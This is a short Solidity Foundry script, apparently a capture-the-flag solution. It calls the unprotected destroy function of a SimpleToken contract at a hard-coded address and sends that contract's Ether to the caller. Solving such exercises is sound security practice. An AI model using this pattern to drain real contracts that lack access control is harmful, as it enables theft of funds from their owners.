// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";

interface ISimpleToken {
    function destroy(address payable _to) external;
}
contract CounterScript is Script {
    ISimpleToken target;

    function setUp() public {
        target = ISimpleToken(0xb5b1F4A685bBCC9F7Ed929A8bb065D04b1A4229A);
    }

    function run() public {
        vm.startBroadcast();

        target.destroy(payable(msg.sender));

        vm.stopBroadcast();
    }
}
